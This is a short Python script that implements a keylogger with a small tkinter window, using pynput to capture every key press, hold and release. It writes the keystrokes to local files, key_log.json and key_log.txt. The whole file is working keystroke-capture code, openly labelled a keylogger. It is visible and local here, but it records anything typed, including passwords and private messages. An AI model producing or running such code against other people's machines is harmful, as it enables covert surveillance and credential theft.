import tkinter as tk
from tkinter import CENTER
from pynput import keyboard
import json

keys_used = []
keys = ""
flag = False

def generate_text_log(key):
    with open('key_log.txt', "w") as keys_file:
        keys_file.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', "w") as key_log:
        json.dump(keys_used, key_log, indent=4)

def on_press(key):
    global flag, keys_used
    key_str = getattr(key, 'char', str(key))
    if flag:
        keys_used.append({'Held': key_str})
    else:
        keys_used.append({'Pressed': key_str})
        flag = True
    generate_json_file(keys_used)

def on_release(key):
    global flag, keys_used, keys
    key_str = getattr(key, 'char', str(key))
    keys_used.append({'Released': key_str})
    generate_json_file(keys_used)
    flag = False
    keys += key_str
    generate_text_log(keys)

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    status_label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    status_label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = tk.Tk()
root.title("Keylogger")

frame = tk.Frame(root, padx=10, pady=10)
frame.pack(expand=True)

status_label = tk.Label(frame, text='Click "Start" to begin keylogging.', anchor=CENTER)
status_label.pack(pady=5)

button_frame = tk.Frame(frame)
button_frame.pack(pady=5)

start_button = tk.Button(button_frame, text="Start", command=start_keylogger)
start_button.pack(side=tk.LEFT, padx=5)

stop_button = tk.Button(button_frame, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=tk.RIGHT, padx=5)

root.geometry("300x150")
root.mainloop()
